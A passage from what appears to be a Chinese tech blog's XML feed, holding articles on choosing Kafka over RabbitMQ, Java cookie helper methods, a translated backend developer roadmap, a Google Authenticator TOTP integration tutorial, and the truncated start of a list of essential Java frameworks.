href="https://mp.weixin.qq.com/s?__biz=MzI3NDAwNDUwNg==&mid=2648307598&idx=1&sn=eeaa9d795ef6ba13368e7a76ca14bae7&chksm=f337f8fbc44071ed8496f251a0b449f63f70c290947c642914f1f1c8349e1cccde4c1841323a#rd">https://mp.weixin.qq.com/s?__biz=MzI3NDAwNDUwNg==&amp;mid=2648307598&amp;idx=1&amp;sn=eeaa9d795ef6ba13368e7a76ca14bae7&amp;chksm=f337f8fbc44071ed8496f251a0b449f63f70c290947c642914f1f1c8349e1cccde4c1841323a#rd</a></p></blockquote><p><strong>如何抉择？？</strong></p><p>总体来说，分布式消息中间件Kafka和RabbitMQ在行业认可、服务支持、可靠性、可维护性、兼容性、易用性等方面各有特色。Kafka在开源许可证、产品活跃度、性能、安全性、可扩展性等方面优于RabbitMQ，Kafka采用的许可证更宽松，活跃度更高，性能远高于RabbitMQ，在安全性和可扩展性方面能够提供更好的保障。Kafka仅在功能上略少于RabbitMQ，但是已经具备了主要的功能。</p><p>综合上述所有评测结果，我们决定选择Kafka。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 消息队列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Cookie 增删改查操作。</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF/Java%20Cookie%20%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E6%93%8D%E4%BD%9C%E3%80%82/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF/Java%20Cookie%20%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E6%93%8D%E4%BD%9C%E3%80%82/</url>
      
        <content type="html"><![CDATA[<h2 id="Cookie属性"><a href="#Cookie属性" class="headerlink" title="Cookie属性"></a>Cookie属性</h2><p>了解这几个属性之后，就知道如何进行Cookie的操作了。</p><h4 id="name"><a href="#name" class="headerlink" title="name"></a>name</h4><p>Cookie的名称。</p><h4 id="value"><a href="#value" class="headerlink" title="value"></a>value</h4><p>Cookie的值。</p><h4 id="maxAge"><a href="#maxAge" class="headerlink" title="maxAge"></a>maxAge</h4><p>Cookie的失效时间，有以下几种值，默认为-1</p><table><thead><tr><th>值</th><th>说明</th></tr></thead><tbody><tr><td>负数</td><td>浏览器关闭后cookie就失效</td></tr><tr><td>0</td><td>马上清除cookie</td></tr><tr><td>正数</td><td>设置过期时间，单位：秒</td></tr></tbody></table><h4 id="path"><a href="#path" class="headerlink" title="path"></a>path</h4><p>Cookie的有效路径，<code>/</code>表示这个路径即该工程下都可以访问该cookie 如果不设置路径，那么只有设置该cookie路径及其子路径可以访问。</p><h2 id="获取所有Cookie"><a href="#获取所有Cookie" class="headerlink" title="获取所有Cookie"></a>获取所有Cookie</h2><pre class="line-numbers language-none"><code class="language-none">public static Cookie[] getCookies(HttpServletRequest request) &#123;return request.getCookies();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>获取cookie很简单，直接从request中获取即可。</p><h2 id="根据名称获取指定Cookie"><a href="#根据名称获取指定Cookie" class="headerlink" title="根据名称获取指定Cookie"></a>根据名称获取指定Cookie</h2><pre class="line-numbers language-none"><code class="language-none">public static Cookie getCookieByName(HttpServletRequest request, String name) &#123;if (StringUtils.isBlank(name)) &#123;return null;&#125;Cookie[] cookies &#x3D; getCookies(request);if (null !&#x3D; cookies) &#123;for (Cookie cookie : cookies) &#123;if (name.equals(cookie.getName())) &#123;return cookie;&#125;&#125;&#125;return null;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从所有cookie中循环判断进行获取指定cookie。</p><h2 id="添加Cookie"><a href="#添加Cookie" class="headerlink" title="添加Cookie"></a>添加Cookie</h2><pre class="line-numbers language-none"><code class="language-none">public static boolean addCookie(HttpServletResponse response, String name, String value,int maxAge) &#123;if (StringUtils.isBlank(name) || StringUtils.isBlank(value)) &#123;return false;&#125;Cookie cookie &#x3D; new Cookie(name.trim(), value.trim());if (maxAge &lt;&#x3D; 0) &#123;maxAge &#x3D; Integer.MAX_VALUE;&#125;cookie.setMaxAge(maxAge);cookie.setPath(&quot;&#x2F;&quot;);response.addCookie(cookie);return true;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个添加很简单。</p><h2 id="删除Cookie"><a href="#删除Cookie" class="headerlink" title="删除Cookie"></a>删除Cookie</h2><pre class="line-numbers language-none"><code class="language-none">public static boolean removeCookie(HttpServletRequest request, HttpServletResponse response,String name) &#123;if (StringUtils.isBlank(name)) &#123;return false;&#125;Cookie[] cookies &#x3D; getCookies(request);if (null !&#x3D; cookies) &#123;for (Cookie cookie : cookies) &#123;if (name.equals(cookie.getName())) &#123;cookie.setValue(null);cookie.setMaxAge(0);cookie.setPath(&quot;&#x2F;&quot;);response.addCookie(cookie);return true;&#125;&#125;&#125;return false;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>删除cookie，把<code>value</code>设置为null，把<code>max-age</code>设置为0就行了。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>编辑操作和删除操作一样，但是需要注意的是修改、删除Cookie时，除value、maxAge之外的所有属性，例如name、path、domain等，都要与原Cookie完全一样。否则，浏览器将视为两个不同的Cookie不予覆盖，导致修改、删除失败。 </p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 综合技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018最新后端开发人员的路线图</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF/2018%E6%9C%80%E6%96%B0%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E7%9A%84%E8%B7%AF%E7%BA%BF%E5%9B%BE/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF/2018%E6%9C%80%E6%96%B0%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E7%9A%84%E8%B7%AF%E7%BA%BF%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<blockquote><blockquote><p>简评：之前，后端开发路线图仅仅是一个技术推荐，且没有明确的方向指明应该遵循的顺序，这份重新制作的指南将会给你一个更好的方向。</p></blockquote></blockquote><p>现在的 Web 开发与几年前完全不同了，有很多不同的东西可以轻易地把人拒之门外，这也是我们决定制作这个循序渐进指南的原因之一，并让任何人可以清楚地了解他们在 web 开发中扮演的角色。</p><p>可以在下面的图片中找到详细的路线图，而我也将在下面的描述中解释每一个步骤。</p><p>在开始之前，虽然我们没有在下面的路线图中列出 HTML &#x2F; CSS 的知识，但建议读者至少要了解一些基本的 HTML &#x2F; CSS 知识。</p><p><img src="http://img.javastack.cn/18-4-19/54754890.jpg"></p><h2 id="Step-1-——-学习一门语言（Learn-a-Language）"><a href="#Step-1-——-学习一门语言（Learn-a-Language）" class="headerlink" title="Step 1 —— 学习一门语言（Learn a Language）"></a><strong>Step 1 —— 学习一门语言（Learn a Language）</strong></h2><p>语言有很多选择，我已经将它们分成几类，以便更容易做出决定。对于刚开始进入后端开发的初学者，我建议你选择任何脚本语言，因为它们有很多功能，可以让你快速起步。如果你有一些前端知识，你可能会发现 Node.js 更容易（还有一个很大的就业市场）。</p><p>如果你已经是后端开发并了解一些脚本语言，我建议不要选择其他脚本语言，而是从「函数式（Functional）」或「多范式（Multiparadigm）」中选择。例如，如果你已经在使用 PHP 或Node.js，请不要使用 Python 或 Ruby，而应该尝试使用 Erlang 或 Golang。它一定会帮助你延伸思维，并将你的思想带到新的视野。</p><h2 id="Step-2-——-练习你学到的东西（Practice-what-you-have-Learnt）"><a href="#Step-2-——-练习你学到的东西（Practice-what-you-have-Learnt）" class="headerlink" title="Step 2 —— 练习你学到的东西（Practice what you have Learnt）"></a><strong>Step 2 —— 练习你学到的东西（Practice what you have Learnt）</strong></h2><p>没有比实践更好的学习方式了。一旦你选择了语言，并且对这些概念有了基本的了解，就可以使用它们，尽你所能制作尽可能多的小应用。下面是一些让你开始的 Idea：</p><ul><li>在 bash 中实现一些你自己使用的命令，比如尝试实现 ls；</li><li>编写一个获取和保存 reddit 上 <code>/r/programming</code> 文章的命令，并保存为 JSON；</li><li>编写一个以 JSON 格式列出目录结构的命令，例如 jsonify dir-name 返回一个带有 dir-name 内部结构的 JSON 文件；</li><li>编写一个读取从上面的步骤得到的 JSON 的命令，并创建目录结构；</li><li>考虑将每天做的一些任务，并尝试将其自动化。</li></ul><h2 id="Step-3-——-学习软件包管理器（Learn-Package-Manager）"><a href="#Step-3-——-学习软件包管理器（Learn-Package-Manager）" class="headerlink" title="Step 3 —— 学习软件包管理器（Learn Package Manager）"></a><strong>Step 3 —— 学习软件包管理器（Learn Package Manager）</strong></h2><p>了解该语言的基础知识并制作了一些示例应用之后，需要了解如何使用该语言的软件包管理器，包管理器可帮助在应用程序中使用外部库，并分发你自己的库供其他人使用。</p><p>如果你选择了 PHP，你将学习的是 Composer，Node.js 有 NPM 或 Yarn，Python 有 Pip，Ruby 有 RubyGems。无论选择什么，请继续学习如何使用其包管理器。</p><h2 id="Step-4-——-标准和最佳实践-（-Standards-and-Best-Practices）"><a href="#Step-4-——-标准和最佳实践-（-Standards-and-Best-Practices）" class="headerlink" title="Step 4 —— 标准和最佳实践 （ Standards and Best Practices）"></a><strong>Step 4 —— 标准和最佳实践 （ Standards and Best Practices）</strong></h2><p>每种语言都有自己的标准和开发的最佳实践，例如 PHP 有 PHP-FIG 和 PSR，使用 Node.js 有许多不同的社区驱动指南，其他语言也有相同的指导。</p><h2 id="Step-5-——-安全（Security）"><a href="#Step-5-——-安全（Security）" class="headerlink" title="Step 5 —— 安全（Security）"></a><strong>Step 5 —— 安全（Security）</strong></h2><p>请务必阅读有关安全的最佳实践，阅读 OWASP 指南并了解不同的安全问题以及如何以选择的语言避免它们。</p><h2 id="Step-6-——-实践（Practice）"><a href="#Step-6-——-实践（Practice）" class="headerlink" title="Step 6 —— 实践（Practice）"></a><strong>Step 6 —— 实践（Practice）</strong></h2><p>你已经掌握了语言、标准和最佳实践的基础知识，安全性以及如何使用软件包管理器。现在开始创建一个包并分发给其他人使用，并确保遵循迄今为止学到的标准和最佳实践。例如，如果您选择了 PHP，那么可以在 Packagist 上发布，如果选择了Node.js，那么可以在 Npm 上发布，等等。</p><p>如果完成了，在 Github 上搜索一些项目，并在某些项目中提一些 PR。下面是一些 Idea：</p><ul><li>重构并实现学到的最佳实践</li><li>查看未解决的 issue 并尝试解决</li><li>添加任何附加功能</li></ul><h2 id="Step-7-——-了解测试（Learn-about-Testing）"><a href="#Step-7-——-了解测试（Learn-about-Testing）" class="headerlink" title="Step 7 —— 了解测试（Learn about Testing）"></a><strong>Step 7 —— 了解测试（Learn about Testing）</strong></h2><p>了解如何在应用程序中编写单元测试和集成测试，另外，了解不同的测试术语，如<code>mocks</code>, <code>stubs</code> 等</p><h2 id="Step-8-——-练习（Practical）"><a href="#Step-8-——-练习（Practical）" class="headerlink" title="Step 8 —— 练习（Practical）"></a><strong>Step 8 —— 练习（Practical）</strong></h2><p>为目前为止所做的实际任务编写单元测试，尤其是步骤 6 中所做的练习。还要学习和计算编写的测试的覆盖率。</p><h2 id="Step-9-——-了解关系数据库（Learn-about-the-Relational-Databases）"><a href="#Step-9-——-了解关系数据库（Learn-about-the-Relational-Databases）" class="headerlink" title="Step 9 —— 了解关系数据库（Learn about the Relational Databases）"></a><strong>Step 9 —— 了解关系数据库（Learn about the Relational Databases）</strong></h2><p>了解如何将数据保存在关系数据库中。在选择要学习的工具之前，请先了解不同的数据库术语，例如键，索引，规范化，元组等。</p><p>这里有几个选项，但如果你学习一个，其的应该也是相当容易去学。你想学习的应该是 MySQL，MariaDB 和 PostgreSQL。可以选择 MySQL。</p><h2 id="Step-10-——-Practical-Time"><a href="#Step-10-——-Practical-Time" class="headerlink" title="Step 10 —— Practical Time"></a><strong>Step 10 —— Practical Time</strong></h2><p>现在是时候把学到的东西拿来用了，使用迄今为止学到的所有内容创建一个简单的应用程序。选择任何一个 idea，可以是创建一个简单的博客，并实现其中的以下功能：</p><ul><li>用户帐户 —— 注册和登录</li><li>注册用户可以创建博客文章</li><li>用户应该能够查看他创建的所有博客文章</li><li>用户应该能够删除他们的博客文章</li><li>确保用户只能看到他的个人博客文章（而不能看其他人的）</li><li>编写单元&#x2F;集成测试</li><li>应该为查询应用索引，分析查询以确保索引有作用。</li></ul><h2 id="Step-11-——-学习框架（-Learn-a-Framework）"><a href="#Step-11-——-学习框架（-Learn-a-Framework）" class="headerlink" title="Step 11 —— 学习框架（ Learn a Framework）"></a><strong>Step 11 —— 学习框架（ Learn a Framework）</strong></h2><p>根据选择的项目和语言，可能需要也可能不需要框架。每种语言都有几个不同的选项，继续看看选择的语言有哪些选项可供选择，然后选择一个。</p><p>如果选择了 PHP，我会建议使用 Laravel 或 Symfony 以及微架构（Lumen 或 Slim），如果你选择 Node.js，有几种不同的选择，但突出的是 Express.js。</p><h2 id="Step-12-——-Practical-Time"><a href="#Step-12-——-Practical-Time" class="headerlink" title="Step 12 ——  Practical Time"></a><strong>Step 12 ——  Practical Time</strong></h2><p>将 step10 中创建的应用程序转换为使用选择的框架，还要确保移植包括测试在内的所有内容。</p><h2 id="Step-13-——-学习-NoSQL-数据库（Learn-a-NoSQL-Database）"><a href="#Step-13-——-学习-NoSQL-数据库（Learn-a-NoSQL-Database）" class="headerlink" title="Step 13 —— 学习 NoSQL 数据库（Learn a NoSQL Database）"></a><strong>Step 13 —— 学习 NoSQL 数据库（Learn a NoSQL Database）</strong></h2><p>首先了解它们是什么，它们与关系数据库有什么不同以及为什么需要它们。 有几种不同的选择，稍微研究下看看，并比较它们的特点和差异。 可以选择的一些常用选项有 MongoDB，Cassandra，RethinkDB 和 Couchbase，如果必须选择一个，请使用 MongoDB。</p><h2 id="Step-14-——-缓存（Caching）"><a href="#Step-14-——-缓存（Caching）" class="headerlink" title="Step 14 —— 缓存（Caching）"></a><strong>Step 14 —— 缓存（Caching）</strong></h2><p>了解如何在应用程序中实现应用程序级缓存，了解如何使用 Redis 或 Memcached，并在 step 12 中创建的应用程序中使用缓存。</p><h2 id="Step-15-——-创建-RESTful-API（Creating-RESTful-APIs）"><a href="#Step-15-——-创建-RESTful-API（Creating-RESTful-APIs）" class="headerlink" title="Step 15 —— 创建 RESTful API（Creating RESTful APIs）"></a><strong>Step 15 —— 创建 RESTful API（Creating RESTful APIs）</strong></h2><p>了解 REST 并学习如何制作 RESTful API，在 Roy Fielding 的文章中阅读关于 REST 的部分，如果他们说 REST 只适用于 HTTP API，那么确保你能够与他人争论。</p><h2 id="Step-16-——-了解不同的认证方法（Learn-about-Different-Auth-Methods）"><a href="#Step-16-——-了解不同的认证方法（Learn-about-Different-Auth-Methods）" class="headerlink" title="Step 16  —— 了解不同的认证方法（Learn about Different Auth Methods）"></a><strong>Step 16  —— 了解不同的认证方法（Learn about Different Auth Methods）</strong></h2><p>了解不同的认证和认证方法，你应该知道他们是什么，有什么不同以及什么时候使用偏好。</p><ul><li>OAuth — Open Authentication</li><li>Basic Authentication</li><li>Token Authentication</li><li>JWT — JSON Web Tokens</li><li>OpenID</li></ul><h2 id="Step-17-——-消息代理（Message-Brokers）"><a href="#Step-17-——-消息代理（Message-Brokers）" class="headerlink" title="Step 17  ——  消息代理（Message Brokers）"></a><strong>Step 17  ——  消息代理（Message Brokers）</strong></h2><p>了解消息代理并了解何时以及为何使用它们。同样有多种选择，但突出的是 RabbitMQ 和Kafka，如果你想选择一个的话，可以先从 RabbitMQ 开始。</p><h2 id="Step-18-——-搜索引擎（Search-Engines）"><a href="#Step-18-——-搜索引擎（Search-Engines）" class="headerlink" title="Step 18 —— 搜索引擎（Search Engines）"></a><strong>Step 18 —— 搜索引擎（Search Engines）</strong></h2><p>随着应用程序的增长，关系数据库或 NoSQL 数据库的简单查询不能够满足要求，而不得不求助于搜索引擎。</p><h2 id="Step-19-——-了解如何使用Docker（-Learn-how-to-use-Docker）"><a href="#Step-19-——-了解如何使用Docker（-Learn-how-to-use-Docker）" class="headerlink" title="Step 19 —— 了解如何使用Docker（ Learn how to use Docker）"></a><strong>Step 19 —— 了解如何使用Docker（ Learn how to use Docker）</strong></h2><p>无论是在复制与生产环境相同的环境，保持操作系统清洁或加快编码、测试或部署，Docker 可以在开发过程中大大方便工作，学习如何使用 Docker。</p><h2 id="Step-20-——-Web-服务器知识（Knowledge-of-Web-Servers）"><a href="#Step-20-——-Web-服务器知识（Knowledge-of-Web-Servers）" class="headerlink" title="Step 20 —— Web 服务器知识（Knowledge of Web Servers）"></a><strong>Step 20 —— Web 服务器知识（Knowledge of Web Servers）</strong></h2><p>如果你已经走到这么远了，你可能已经在前面的步骤中使用了服务器，这一步主要是找出不同Web 服务器之间的差异，了解限制和不同的可用配置选项，以及如何最好地利用这些限制编写应用程序。</p><h2 id="Step-21-——-了解如何使用Web-Scoket（Learn-how-to-use-Web-Sockets）"><a href="#Step-21-——-了解如何使用Web-Scoket（Learn-how-to-use-Web-Sockets）" class="headerlink" title="Step 21 —— 了解如何使用Web Scoket（Learn how to use Web Sockets）"></a><strong>Step 21 —— 了解如何使用Web Scoket（Learn how to use Web Sockets）</strong></h2><p>虽然不是必需的，但在工具带中有这些知识是有益的，学习如何使用 web-sockets 编写实时Web 应用程序并使用它创建一些示例应用程序。可以在上面制作的博客应用程序中使用它来实现博客文章列表中的实时更新。</p><h2 id="Step-22-——-学习-GraphQL（Learn-GraphQL）"><a href="#Step-22-——-学习-GraphQL（Learn-GraphQL）" class="headerlink" title="Step 22 —— 学习 GraphQL（Learn GraphQL）"></a><strong>Step 22 —— 学习 GraphQL（Learn GraphQL）</strong></h2><p>学习如何使用 GraphQL 制作 API，了解它与 REST 的不同之处，以及它为什么被称为 REST 2.0。</p><h2 id="Step-23-——-看看图数据库（Look-into-Graph-Databases）"><a href="#Step-23-——-看看图数据库（Look-into-Graph-Databases）" class="headerlink" title="Step 23 —— 看看图数据库（Look into Graph Databases）"></a><strong>Step 23 —— 看看图数据库（Look into Graph Databases）</strong></h2><p>图模型代表了一种非常灵活的处理数据关系的方式，图数据库为其提供了快速高效的存储、检索和查询方式，学习如何使用 Neo4j 或 OrientDB。</p><h2 id="Step-24-——-继续探索（Keep-Exploring）"><a href="#Step-24-——-继续探索（Keep-Exploring）" class="headerlink" title="Step 24 —— 继续探索（Keep Exploring）"></a><strong>Step 24 —— 继续探索（Keep Exploring）</strong></h2><p>一旦你开始学习和练习，你一定会遇到我们在这个路线图中没有涉及的东西，只要保持开放的心态和对新事物的渴望就好。</p><p>关键是要尽可能多地练习，起初你可能会觉得你并没有抓住任何东西，但这是正常的，随着时间的推移，你会觉得越来越好。</p><blockquote><p>原文：<a href="https://medium.com/tech-tajawal/modern-backend-developer-in-2018-6b3f7b5f8b9">https://medium.com/tech-tajawal/modern-backend-developer-in-2018-6b3f7b5f8b9</a><br>译文：<a href="https://zhuanlan.zhihu.com/p/35620194">https://zhuanlan.zhihu.com/p/35620194</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 综合技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 接入 Google 身份验证器实战</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF/Java%20%E6%8E%A5%E5%85%A5%20Google%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E5%99%A8%E5%AE%9E%E6%88%98/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF/Java%20%E6%8E%A5%E5%85%A5%20Google%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E5%99%A8%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h4 id="两步验证"><a href="#两步验证" class="headerlink" title="两步验证"></a>两步验证</h4><p>大家应该对两步验证都熟悉吧？如苹果有自带的两步验证策略，防止用户账号密码被盗而锁定手机进行敲诈，这种例子屡见不鲜，所以苹果都建议大家开启两步验证的。</p><p>Google 的身份验证器一般也是用于登录进行两步验证，和苹果的两步验证是同样的道理。只不过 Google 的身份验证器用得更多更广泛，如 GitHub 的两步验证都是基于 Google 身份验证器。</p><h4 id="Google-Authenticator-简介"><a href="#Google-Authenticator-简介" class="headerlink" title="Google Authenticator 简介"></a>Google Authenticator 简介</h4><p>Google Authenticator 身份验证器是一款基于时间与哈希的一次性密码算法的两步验证软件令牌，用户需要下载手机 APP（Authenticator），该手机 APP 与网站进行绑定，当网站验证完用户名和密码之后会验证此 APP 上对应生成的 6 位验证码数字，验证通过则成功登录，否则登录失败。 </p><h4 id="Google-Authenticator-使用"><a href="#Google-Authenticator-使用" class="headerlink" title="Google Authenticator 使用"></a>Google Authenticator 使用</h4><p>我们来看下 Github 上的使用 Google 身份验证器开启两步验证的应用。</p><p>如图所示，默认 Github 是没有开启两步验证的，点击设置按钮进行设置。</p><p><img src="http://img.javastack.cn/18-6-4/89202323.jpg"></p><p>Github 提供了基于 APP （谷歌身份验证器）和短信验证码两种两步验证的方式，我们选择第一种谷歌身份验证器。</p><p><img src="http://img.javastack.cn/18-6-4/60561582.jpg"></p><p>进入第一种验证模式，接下来展示了一堆的恢复码，用来当 APP 验证器不能工作的紧急情况使用。把它们保存起来，然后点击下一步。</p><p><img src="http://img.javastack.cn/18-6-4/53581436.jpg"></p><p>这个就是身份验证器的关键了，下载 Google 的 <code>Authenticator</code> APP，然后扫描这个二维码进行绑定。</p><p><img src="http://img.javastack.cn/18-6-4/22628043.jpg"></p><p>绑定之后，APP Github 模块下面会显示一个 6 位的验证码，把它输入到上面那个框里面就行了。</p><p><img src="http://img.javastack.cn/18-6-4/52228687.jpg"></p><p>如下图所示，已经成功开启两步验证了。</p><p><img src="http://img.javastack.cn/18-6-4/67672750.jpg"></p><p>接下来我们退出 Github 再重新登录，页面就会提示要输入 Google 的身份验证器验证码了，如果 APP 不能正常工作，最下方还能通过之前保存下来的恢复码进行登录。</p><p><img src="http://img.javastack.cn/18-6-4/8537646.jpg"></p><p>好了，Google Authenticator 使用就到这里，那它是如何工作的，它是什么原理呢？我们的网站、APP 如何接入 Google Authenticator，接下来我们一一拉开谜底。</p><h4 id="Google-Authenticator-工作流程"><a href="#Google-Authenticator-工作流程" class="headerlink" title="Google Authenticator 工作流程"></a>Google Authenticator 工作流程</h4><p>实际上 Google Authenticator 采用的是 TOTP 算法（Time-Based One-Time Password，即基于时间的一次性密码），其核心内容包括以下三点。</p><p><strong>1、安全密钥</strong></p><p>是客户端和服务端约定的安全密钥，也是手机端 APP 身份验证器绑定（手机端通过扫描或者手输安全密钥进行绑定）和验证码的验证都需要的一个唯一的安全密钥，该密钥由加密算法生成，并最后由 Base32 编码而成。</p><p><strong>2、验证时间</strong></p><p>Google 选择了 30 秒作为时间片，T的数值为 从Unix epoch（1970年1月1日 00:00:00）来经历的 30 秒的个数，所以在 Google Authenticator 中我们可以看见验证码每个 30 秒就会刷新一次。</p><p>更详细原理参考：</p><blockquote><p><a href="https://blog.seetee.me/post/2011/google-two-step-verification/">https://blog.seetee.me/post/2011/google-two-step-verification/</a></p></blockquote><p><strong>3、签署算法</strong></p><p>Google 使用的是 HMAC-SHA1 算法，全称是：Hash-based message authentication code(哈希运算消息认证码)，它是以一个密钥和一个消息为输入，生成一个消息摘要作为输出，这里以 SHA1 算法作为消息输入。</p><p>使用 HMAC 算法是因为只有用户本身知道正确的输入密钥，因此会得到唯一的输出，其算法可以简单表示为：</p><blockquote><p>hmac &#x3D; SHA1(secret + SHA1(secret + input))</p></blockquote><p>事实上，TOTP 是 HMAC-OTP（基于HMAC的一次密码生成）的超集，区别是 TOTP 是以当前时间作为输入，而HMAC-OTP 则是以自增计算器作为输入，该计数器使用时需要进行同步。</p><h4 id="Google-Authenticator-实战"><a href="#Google-Authenticator-实战" class="headerlink" title="Google Authenticator 实战"></a>Google Authenticator 实战</h4><p>知道上面的原理，我们就可以来应用实战了。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** *  *&#x2F;public class AuthTest &#123;@Testpublic void genSecretTest() &#123;String secret &#x3D; GoogleAuthenticator.generateSecretKey();String qrcode &#x3D; GoogleAuthenticator.getQRBarcodeURL(&quot;Java&quot;, &quot;javastack.cn&quot;, secret);System.out.println(&quot;二维码地址:&quot; + qrcode);System.out.println(&quot;密钥:&quot; + secret);&#125;@Testpublic void verifyTest() &#123;String secret &#x3D; &quot;ZJTAQGLVOZ7ATWH2&quot;;long code &#x3D; 956235;GoogleAuthenticator ga &#x3D; new GoogleAuthenticator();boolean r &#x3D; ga.verifCode(secret, code);System.out.println(&quot;是否正确：&quot; + r);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个方法是生成密钥和一个扫描二维码绑定的URL。</p><p>第二个方法是根据密钥和验证码进行验证。</p><p>这里仅提供一下 GoogleAuthenticator 类的源码逻辑参考。</p><blockquote><p><a href="http://awtqty-zhang.iteye.com/blog/1986275">http://awtqty-zhang.iteye.com/blog/1986275</a></p></blockquote><p>如果有收获欢迎点赞转发，也可以留言发表你的疑问和看法。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 综合技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 程序员必备的 15 个框架，前 3 个地位无可动摇！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF/Java%20%E7%A8%8B%E5%BA%8F%E5%91%98%E5%BF%85%E5%A4%87%E7%9A%84%2015%20%E4%B8%AA%E6%A1%86%E6%9E%B6%EF%BC%8C%E5%89%8D%203%20%E4%B8%AA%E5%9C%B0%E4%BD%8D%E6%97%A0%E5%8F%AF%E5%8A%A8%E6%91%87%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF/Java%20%E7%A8%8B%E5%BA%8F%E5%91%98%E5%BF%85%E5%A4%87%E7%9A%84%2015%20%E4%B8%AA%E6%A1%86%E6%9E%B6%EF%BC%8C%E5%89%8D%203%20%E4%B8%AA%E5%9C%B0%E4%BD%8D%E6%97%A0%E5%8F%AF%E5%8A%A8%E6%91%87%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>Java 程序员方向太多，且不说移动开发、大数据、区块链、人工智能这些，大部分 Java 程序员都是 Java Web&#x2F;后端开发。那作为一名 Java Web 开发程序员必须需要熟悉哪些框架呢？</p><p>今天，栈长我给大家列举了一些通用的、必须掌握的框架，学会这些，20K+ 不是问题。</p><h2 id="1-Spring"><a href="#1-Spring" class="headerlink" title="1.Spring"></a>1.Spring</h2><p>毫无疑问，Spring 框架现在是 Java 后端框架家族里面最强大的一个，其拥有 IOC 和 AOP 两大利器，大大简化了软件开发复杂性。并且，Spring 现在能与所有主流开发框架集成，可谓是一个万能框架，Spring 让 JAVA 开发变得更多简单。</p><p><strong>官网：</strong></p><blockquote><p><a href="https://spring.io/projects/spring-framework">https://spring.io/projects/spring-framework</a></p></blockquote><p><strong>源码：</strong></p><blockquote><p><a href="https://github.com/spring-projects/spring-framework">https://github.com/spring-projects/spring-framework</a></p></blockquote><p><strong>推荐：</strong></p><h2 id="2-Spring-MVC"><a href="#2-Spring-MVC" class="headerlink" title="2.Spring MVC"></a>2.Spring MVC</h2><p>Spring MVC 是一个 MVC 开源框架，用来代替 Struts。它是 Spring 项目里面的一个重要组成部分，能与 Spring IOC 容器紧密结合，以及拥有松耦合、方便配置、代码分离等特点，让 JAVA 程序员开发 WEB 项目变得更加容易。</p><p><strong>官网：</strong></p><blockquote><p><a href="https://spring.io/projects/spring-framework">https://spring.io/projects/spring-framework</a></p></blockquote><p><strong>源码：</strong></p><blockquote><p><a href="https://github.com/spring-projects/spring-framework">https://github.com/spring-projects/spring-framework</a></p></blockquote><p><strong>推荐：</strong></p><h2 id="3-Spring-Boot"><a href="#3-Spring-Boot" class="headerlink" title="3.Spring Boot"></a>3.Spring Boot</h2><p>Spring Boot 是 Spring 开源组织下的一个子项目，也是 Spring 组件一站式解决方案，主要是为了简化使用 Spring 框架的难度，简省繁重的配置。</p><p>Spring Boot提供了各种组件的启动器（starters），开发者只要能配置好对应组件参数，Spring Boot 就会自动配置，让开发者能快速搭建依赖于 